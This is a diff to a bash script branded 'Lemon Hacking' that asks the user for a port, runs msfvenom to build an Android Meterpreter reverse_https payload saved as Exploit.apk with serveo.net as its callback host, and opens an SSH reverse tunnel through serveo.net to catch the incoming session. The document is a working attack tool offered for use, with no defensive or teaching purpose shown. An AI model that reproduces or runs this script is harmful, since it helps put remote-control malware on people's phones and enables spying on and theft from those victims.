@@ -2,9 +2,25 @@ clear
 figlet L e m o n
 figlet H a c k i n g
 echo By Lemon Hacking
-echo LHOST=serveo.net
-echo LPORT=4716
-ssh -o "ExitOnForwardFailure yes" -R 4716:localhost:4716 serveo.net
+echo [+] PLEASE ENTER A PORT, '(more than 1024)' | lolcat
+read port
+if [ $port -le 1024 ]
+then
+printf "\033[1;31m[-] Port must be more than 1024\033[0m\n"
+else
+echo [+] Do you want to continue? | lolcat
+read ans
+if [ $ans = yes ]
+then
+echo [+] LHOST=serveo.net | lolcat
+echo [+] LPORT=$port | lolcat
+echo [+] This may take a few minutes | lolcat
+msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=$port R> $HOME/Lemon/Exploit.apk
+ssh -o "ExitOnForwardFailure yes" -R $port:localhost:$port serveo.net
 clear
-echo Port is in use
-echo Please try again later
+printf "\033[1;31m[-] Port is in use\033[0m\n"
+printf "\033[1;31m[-] Please try again later\033[0m\n"
+else
+printf "\033[1;31m[-] Exiting..\033[0m\n"
+fi
+fi
